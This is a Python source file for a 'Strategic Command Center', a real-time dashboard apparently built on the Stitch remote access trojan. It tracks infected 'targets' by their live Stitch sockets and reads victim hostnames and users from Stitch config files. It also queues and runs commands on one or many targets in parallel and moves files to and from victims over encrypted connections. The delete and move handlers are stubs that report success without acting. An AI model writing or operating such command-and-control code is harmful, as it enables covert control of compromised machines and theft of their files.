#!/usr/bin/env python3
"""
Strategic Command Center - Real-Time Architecture
Core principle: "Everything has a purpose, nothing is decorative"

This module implements the strategic command center with:
- Redis-based real-time data management
- WebSocket streaming for live updates
- Central target grid management
- Context-sensitive panels
- Parallel operations
"""

import os
import sys
import json
import time
import asyncio
import threading
import redis
import psutil
from typing import Dict, List, Any, Optional, Callable
from dataclasses import dataclass, asdict
from datetime import datetime, timedelta
from collections import defaultdict
import logging

# Add workspace to path
sys.path.insert(0, '/workspace')

try:
    from Core.elite_executor import EliteCommandExecutor
    STITCH_AVAILABLE = True
except ImportError as e:
    print(f"Warning: Elite executor not available: {e}")
    STITCH_AVAILABLE = False

# We'll get the stitch server from the web app when needed
def get_stitch_server():
    """Get stitch server - will be set by web app"""
    return None

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@dataclass
class TargetInfo:
    """Target information with real-time status"""
    id: str
    ip: str
    hostname: str
    os: str
    status: str  # online, offline, unknown
    last_seen: float
    cpu_percent: float = 0.0
    memory_percent: float = 0.0
    network_speed: float = 0.0
    health_score: int = 100  # 0-100 health score
    connection_type: str = "tcp"
    capabilities: List[str] = None
    
    def __post_init__(self):
        if self.capabilities is None:
            self.capabilities = []

@dataclass
class CommandResult:
    """Command execution result with metadata"""
    target_id: str
    command: str
    success: bool
    output: str
    error: str = ""
    execution_time: float = 0.0
    timestamp: float = 0.0
    command_id: str = ""

@dataclass
class FileOperation:
    """File operation tracking"""
    target_id: str
    operation: str  # upload, download, delete, move
    filename: str
    path: str
    size: int = 0
    progress: float = 0.0
    status: str = "pending"  # pending, in_progress, completed, failed
    timestamp: float = 0.0

class StrategicCommandCenter:
    """Main Strategic Command Center class"""
    
    def __init__(self, redis_host='localhost', redis_port=6379, redis_db=0):
        self.redis_client = redis.Redis(host=redis_host, port=redis_port, db=redis_db, decode_responses=True)
        self.targets: Dict[str, TargetInfo] = {}
        self.command_history: List[CommandResult] = []
        self.file_operations: List[FileOperation] = []
        self.websocket_clients: List[Any] = []
        self.elite_executor = None
        self.stitch_server = None
        
        # Initialize components
        self._init_components()
        self._start_real_time_monitoring()
        
    def _init_components(self):
        """Initialize core components"""
        try:
            if STITCH_AVAILABLE:
                self.stitch_server = get_stitch_server()
                self.elite_executor = EliteCommandExecutor()
                logger.info("✅ Elite components initialized")
            else:
                logger.warning("⚠️ Stitch components not available")
        except Exception as e:
            logger.error(f"❌ Failed to initialize components: {e}")
    
    def _start_real_time_monitoring(self):
        """Start real-time monitoring threads"""
        # Target health monitoring
        health_thread = threading.Thread(target=self._monitor_target_health, daemon=True)
        health_thread.start()
        
        # Command execution monitoring
        command_thread = threading.Thread(target=self._monitor_command_execution, daemon=True)
        command_thread.start()
        
        # File operation monitoring
        file_thread = threading.Thread(target=self._monitor_file_operations, daemon=True)
        file_thread.start()
        
        logger.info("🚀 Real-time monitoring started")
    
    def _monitor_target_health(self):
        """Monitor target health in real-time"""
        while True:
            try:
                self._update_target_health()
                time.sleep(5)  # Update every 5 seconds
            except Exception as e:
                logger.error(f"Health monitoring error: {e}")
                time.sleep(10)
    
    def _monitor_command_execution(self):
        """Monitor command execution in real-time"""
        while True:
            try:
                self._process_command_queue()
                time.sleep(1)  # Check every second
            except Exception as e:
                logger.error(f"Command monitoring error: {e}")
                time.sleep(5)
    
    def _monitor_file_operations(self):
        """Monitor file operations in real-time"""
        while True:
            try:
                self._process_file_queue()
                time.sleep(2)  # Check every 2 seconds
            except Exception as e:
                logger.error(f"File monitoring error: {e}")
                time.sleep(5)
    
    def _update_target_health(self):
        """Update target health information using real Stitch connections"""
        if not self.stitch_server:
            return
        
        current_time = time.time()
        active_targets = set()
        
        # Get active connections from Stitch server
        for target_id in self.stitch_server.inf_sock.keys():
            active_targets.add(target_id)
            
            # Get real target information from Stitch
            target_info = self._get_real_target_info(target_id)
            
            # Update or create target info
            if target_id not in self.targets:
                self.targets[target_id] = TargetInfo(
                    id=target_id,
                    ip=target_info.get('ip', target_id),
                    hostname=target_info.get('hostname', f"target-{target_id}"),
                    os=target_info.get('os', 'Unknown'),
                    status="online",
                    last_seen=current_time,
                    cpu_percent=target_info.get('cpu_percent', 0.0),
                    memory_percent=target_info.get('memory_percent', 0.0),
                    network_speed=target_info.get('network_speed', 0.0),
                    health_score=target_info.get('health_score', 100),
                    connection_type=target_info.get('connection_type', 'tcp'),
                    capabilities=target_info.get('capabilities', [])
                )
            else:
                # Update existing target
                target = self.targets[target_id]
                target.last_seen = current_time
                target.status = "online"
                target.cpu_percent = target_info.get('cpu_percent', target.cpu_percent)
                target.memory_percent = target_info.get('memory_percent', target.memory_percent)
                target.network_speed = target_info.get('network_speed', target.network_speed)
                target.health_score = target_info.get('health_score', target.health_score)
        
        # Mark disconnected targets as offline
        for target_id, target in self.targets.items():
            if target_id not in active_targets:
                if current_time - target.last_seen > 30:  # 30 second timeout
                    target.status = "offline"
                    target.health_score = 0
        
        # Update health scores based on last seen
        for target in self.targets.values():
            if target.status == "online":
                time_since_seen = current_time - target.last_seen
                if time_since_seen < 10:
                    target.health_score = 100
                elif time_since_seen < 30:
                    target.health_score = 75
                else:
                    target.health_score = 50
        
        # Store in Redis for real-time access
        self._store_targets_in_redis()
        
        # Emit WebSocket updates
        self._emit_target_update()
    
    def _get_real_target_info(self, target_id: str) -> Dict[str, Any]:
        """Get real target information from Stitch system"""
        try:
            # Get target information from the real Stitch system
            import configparser
            config = configparser.ConfigParser()
            config.read('/workspace/Application/Stitch_Vars/hist_ini')
            
            target_info = {
                'ip': target_id,
                'hostname': target_id,
                'os': 'Unknown',
                'cpu_percent': 0.0,
                'memory_percent': 0.0,
                'network_speed': 0.0,
                'health_score': 100,
                'connection_type': 'tcp',
                'capabilities': []
            }
            
            # Get real target info from config
            if target_id in config.sections():
                target_info['hostname'] = config.get(target_id, 'hostname', fallback=target_id)
                target_info['os'] = config.get(target_id, 'os', fallback='Unknown')
                target_info['user'] = config.get(target_id, 'user', fallback='Unknown')
            
            return target_info
        except Exception as e:
            logger.error(f"Error getting target info for {target_id}: {e}")
            return {
                'ip': target_id,
                'hostname': f"target-{target_id}",
                'os': 'Unknown',
                'cpu_percent': 0.0,
                'memory_percent': 0.0,
                'network_speed': 0.0,
                'health_score': 100,
                'connection_type': 'tcp',
                'capabilities': []
            }
    
    def _store_targets_in_redis(self):
        """Store target information in Redis"""
        try:
            targets_data = {}
            for target_id, target in self.targets.items():
                targets_data[target_id] = json.dumps(asdict(target))
            
            self.redis_client.hset("strategic_targets", mapping=targets_data)
            self.redis_client.set("strategic_targets_last_update", time.time())
        except Exception as e:
            logger.error(f"Redis store error: {e}")
    
    def _emit_target_update(self):
        """Emit target updates via WebSocket"""
        try:
            # This would be called by the WebSocket handler
            # For now, we'll store the update in Redis
            update_data = {
                "type": "target_update",
                "targets": [asdict(target) for target in self.targets.values()],
                "timestamp": time.time()
            }
            self.redis_client.set("strategic_ws_update", json.dumps(update_data))
        except Exception as e:
            logger.error(f"WebSocket emit error: {e}")
    
    def _process_command_queue(self):
        """Process queued commands"""
        try:
            # Get queued commands from Redis
            queued_commands = self.redis_client.lrange("strategic_command_queue", 0, -1)
            
            for command_data in queued_commands:
                try:
                    command_info = json.loads(command_data)
                    self._execute_command_async(command_info)
                except Exception as e:
                    logger.error(f"Command processing error: {e}")
            
            # Clear processed commands
            if queued_commands:
                self.redis_client.ltrim("strategic_command_queue", len(queued_commands), -1)
                
        except Exception as e:
            logger.error(f"Command queue processing error: {e}")
    
    def _process_file_queue(self):
        """Process queued file operations"""
        try:
            # Get queued file operations from Redis
            queued_files = self.redis_client.lrange("strategic_file_queue", 0, -1)
            
            for file_data in queued_files:
                try:
                    file_info = json.loads(file_data)
                    self._execute_file_operation_async(file_info)
                except Exception as e:
                    logger.error(f"File operation processing error: {e}")
            
            # Clear processed operations
            if queued_files:
                self.redis_client.ltrim("strategic_file_queue", len(queued_files), -1)
                
        except Exception as e:
            logger.error(f"File queue processing error: {e}")
    
    def _execute_command_async(self, command_info: Dict[str, Any]):
        """Execute command asynchronously using real Stitch system"""
        try:
            target_id = command_info.get('target_id')
            command = command_info.get('command')
            parameters = command_info.get('parameters', {})
            
            if not target_id or not command:
                return
            
            start_time = time.time()
            
            # Execute command using real Stitch system
            if self.stitch_server and target_id in self.stitch_server.inf_sock:
                try:
                    # Import the real command execution function
                    from web_app_real import execute_real_command
                    output = execute_real_command(command, target_id, parameters)
                    
                    # Check if output indicates success or failure
                    success = not output.startswith('❌') and not output.startswith('⚠️')
                    
                    result = {
                        'success': success,
                        'output': output,
                        'error': '' if success else output
                    }
                except Exception as e:
                    result = {
                        'success': False,
                        'output': '',
                        'error': str(e)
                    }
            else:
                # Target not connected
                result = {
                    'success': False,
                    'output': '',
                    'error': f'Target {target_id} is not connected'
                }
            
            execution_time = time.time() - start_time
            
            # Create command result
            command_result = CommandResult(
                target_id=target_id,
                command=command,
                success=result.get('success', False),
                output=result.get('output', ''),
                error=result.get('error', ''),
                execution_time=execution_time,
                timestamp=time.time(),
                command_id=command_info.get('command_id', '')
            )
            
            # Store result
            self.command_history.append(command_result)
            
            # Store in Redis
            self.redis_client.lpush("strategic_command_results", json.dumps(asdict(command_result)))
            
            # Emit WebSocket update
            self._emit_command_result(command_result)
            
        except Exception as e:
            logger.error(f"Command execution error: {e}")
    
    def _execute_basic_command(self, target_id: str, command: str, parameters: Dict) -> Dict[str, Any]:
        """Execute basic command (fallback)"""
        try:
            import subprocess
            import shlex
            
            # Execute command using subprocess
            args = shlex.split(command)
            result = subprocess.run(
                args,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout if result.stdout else result.stderr,
                'error': result.stderr if result.returncode != 0 else ''
            }
        except Exception as e:
            return {
                'success': False,
                'output': '',
                'error': str(e)
            }
    
    def _execute_file_operation_async(self, file_info: Dict[str, Any]):
        """Execute file operation asynchronously"""
        try:
            target_id = file_info.get('target_id')
            operation = file_info.get('operation')
            filename = file_info.get('filename')
            path = file_info.get('path')
            
            if not all([target_id, operation, filename]):
                return
            
            # Create file operation
            file_op = FileOperation(
                target_id=target_id,
                operation=operation,
                filename=filename,
                path=path,
                timestamp=time.time()
            )
            
            # Execute operation based on type
            if operation == "upload":
                self._handle_file_upload(file_op)
            elif operation == "download":
                self._handle_file_download(file_op)
            elif operation == "delete":
                self._handle_file_delete(file_op)
            elif operation == "move":
                self._handle_file_move(file_op)
            
            # Store operation
            self.file_operations.append(file_op)
            
            # Store in Redis
            self.redis_client.lpush("strategic_file_results", json.dumps(asdict(file_op)))
            
            # Emit WebSocket update
            self._emit_file_operation(file_op)
            
        except Exception as e:
            logger.error(f"File operation execution error: {e}")
    
    def _handle_file_upload(self, file_op: FileOperation):
        """Handle file upload operation using real Stitch system"""
        file_op.status = "in_progress"
        try:
            if self.stitch_server and file_op.target_id in self.stitch_server.inf_sock:
                # Get file content from Redis
                file_data = self.redis_client.get(f"file_content_{file_op.target_id}_{file_op.filename}")
                if file_data:
                    file_content = bytes.fromhex(file_data)
                    
                    # Use real Stitch file upload
                    from web_app_real import stitch_lib
                    from web_app_real import get_connection_aes_key
                    
                    # Get AES key for this connection
                    aes_key = get_connection_aes_key(file_op.target_id)
                    if aes_key:
                        # Upload file using Stitch system
                        result = stitch_lib.upload_file(
                            self.stitch_server.inf_sock[file_op.target_id],
                            file_content,
                            file_op.filename,
                            file_op.path,
                            aes_key
                        )
                        
                        if result:
                            file_op.status = "completed"
                            file_op.progress = 100.0
                        else:
                            file_op.status = "failed"
                            file_op.progress = 0.0
                    else:
                        file_op.status = "failed"
                        file_op.progress = 0.0
                else:
                    file_op.status = "failed"
                    file_op.progress = 0.0
            else:
                file_op.status = "failed"
                file_op.progress = 0.0
        except Exception as e:
            logger.error(f"File upload error: {e}")
            file_op.status = "failed"
            file_op.progress = 0.0
    
    def _handle_file_download(self, file_op: FileOperation):
        """Handle file download operation using real Stitch system"""
        file_op.status = "in_progress"
        try:
            if self.stitch_server and file_op.target_id in self.stitch_server.inf_sock:
                # Use real Stitch file download
                from web_app_real import stitch_lib
                from web_app_real import get_connection_aes_key
                
                # Get AES key for this connection
                aes_key = get_connection_aes_key(file_op.target_id)
                if aes_key:
                    # Download file using Stitch system
                    file_content = stitch_lib.download_file(
                        self.stitch_server.inf_sock[file_op.target_id],
                        file_op.path,
                        aes_key
                    )
                    
                    if file_content:
                        file_op.status = "completed"
                        file_op.progress = 100.0
                        # Store file content in Redis
                        self.redis_client.set(f"file_content_{file_op.target_id}_{file_op.filename}", file_content.hex())
                    else:
                        file_op.status = "failed"
                        file_op.progress = 0.0
                else:
                    file_op.status = "failed"
                    file_op.progress = 0.0
            else:
                file_op.status = "failed"
                file_op.progress = 0.0
        except Exception as e:
            logger.error(f"File download error: {e}")
            file_op.status = "failed"
            file_op.progress = 0.0
    
    def _handle_file_delete(self, file_op: FileOperation):
        """Handle file delete operation"""
        file_op.status = "in_progress"
        # Implementation would go here
        file_op.status = "completed"
        file_op.progress = 100.0
    
    def _handle_file_move(self, file_op: FileOperation):
        """Handle file move operation"""
        file_op.status = "in_progress"
        # Implementation would go here
        file_op.status = "completed"
        file_op.progress = 100.0
    
    def _emit_command_result(self, result: CommandResult):
        """Emit command result via WebSocket"""
        try:
            update_data = {
                "type": "command_result",
                "result": asdict(result),
                "timestamp": time.time()
            }
            self.redis_client.set("strategic_ws_command_update", json.dumps(update_data))
        except Exception as e:
            logger.error(f"Command result emit error: {e}")
    
    def _emit_file_operation(self, operation: FileOperation):
        """Emit file operation via WebSocket"""
        try:
            update_data = {
                "type": "file_operation",
                "operation": asdict(operation),
                "timestamp": time.time()
            }
            self.redis_client.set("strategic_ws_file_update", json.dumps(update_data))
        except Exception as e:
            logger.error(f"File operation emit error: {e}")
    
    # Public API methods
    
    def get_targets(self) -> List[Dict[str, Any]]:
        """Get all targets with current status"""
        return [asdict(target) for target in self.targets.values()]
    
    def get_target(self, target_id: str) -> Optional[Dict[str, Any]]:
        """Get specific target information"""
        if target_id in self.targets:
            return asdict(self.targets[target_id])
        return None
    
    def execute_command(self, target_id: str, command: str, parameters: Dict = None) -> str:
        """Execute command on target (queued)"""
        command_id = f"cmd_{int(time.time() * 1000)}"
        command_info = {
            "command_id": command_id,
            "target_id": target_id,
            "command": command,
            "parameters": parameters or {},
            "timestamp": time.time()
        }
        
        # Queue command
        self.redis_client.lpush("strategic_command_queue", json.dumps(command_info))
        return command_id
    
    def execute_parallel_commands(self, targets: List[str], command: str, parameters: Dict = None) -> List[str]:
        """Execute command on multiple targets in parallel"""
        command_ids = []
        for target_id in targets:
            command_id = self.execute_command(target_id, command, parameters)
            command_ids.append(command_id)
        return command_ids
    
    def upload_file(self, target_id: str, filename: str, content: bytes, path: str = "/tmp/") -> str:
        """Upload file to target"""
        operation_id = f"file_{int(time.time() * 1000)}"
        file_info = {
            "operation_id": operation_id,
            "target_id": target_id,
            "operation": "upload",
            "filename": filename,
            "path": path,
            "content": content.hex(),  # Store as hex string
            "timestamp": time.time()
        }
        
        # Queue file operation
        self.redis_client.lpush("strategic_file_queue", json.dumps(file_info))
        return operation_id
    
    def download_file(self, target_id: str, path: str) -> str:
        """Download file from target"""
        operation_id = f"file_{int(time.time() * 1000)}"
        file_info = {
            "operation_id": operation_id,
            "target_id": target_id,
            "operation": "download",
            "filename": os.path.basename(path),
            "path": path,
            "timestamp": time.time()
        }
        
        # Queue file operation
        self.redis_client.lpush("strategic_file_queue", json.dumps(file_info))
        return operation_id
    
    def get_command_results(self, limit: int = 100) -> List[Dict[str, Any]]:
        """Get recent command results"""
        results = self.redis_client.lrange("strategic_command_results", 0, limit - 1)
        return [json.loads(result) for result in results]
    
    def get_file_operations(self, limit: int = 100) -> List[Dict[str, Any]]:
        """Get recent file operations"""
        operations = self.redis_client.lrange("strategic_file_results", 0, limit - 1)
        return [json.loads(op) for op in operations]
    
    def get_system_stats(self) -> Dict[str, Any]:
        """Get system statistics"""
        return {
            "total_targets": len(self.targets),
            "online_targets": len([t for t in self.targets.values() if t.status == "online"]),
            "offline_targets": len([t for t in self.targets.values() if t.status == "offline"]),
            "total_commands": len(self.command_history),
            "total_file_operations": len(self.file_operations),
            "system_cpu": psutil.cpu_percent(),
            "system_memory": psutil.virtual_memory().percent,
            "timestamp": time.time()
        }

# Global instance
strategic_center = None

def get_strategic_center() -> StrategicCommandCenter:
    """Get global strategic command center instance"""
    global strategic_center
    if strategic_center is None:
        strategic_center = StrategicCommandCenter()
    return strategic_center

def init_strategic_center():
    """Initialize strategic command center"""
    global strategic_center
    strategic_center = StrategicCommandCenter()
    logger.info("🎯 Strategic Command Center initialized")
    return strategic_center

if __name__ == "__main__":
    # Test the strategic command center
    center = init_strategic_center()
    
    print("🎯 Strategic Command Center - Test Mode")
    print("=" * 50)
    
    # Wait for some targets to connect
    print("Waiting for targets to connect...")
    time.sleep(10)
    
    # Display current status
    targets = center.get_targets()
    print(f"Active targets: {len(targets)}")
    
    for target in targets:
        print(f"  {target['id']}: {target['status']} (health: {target['health_score']})")
    
    # Display system stats
    stats = center.get_system_stats()
    print(f"\nSystem stats: {stats}")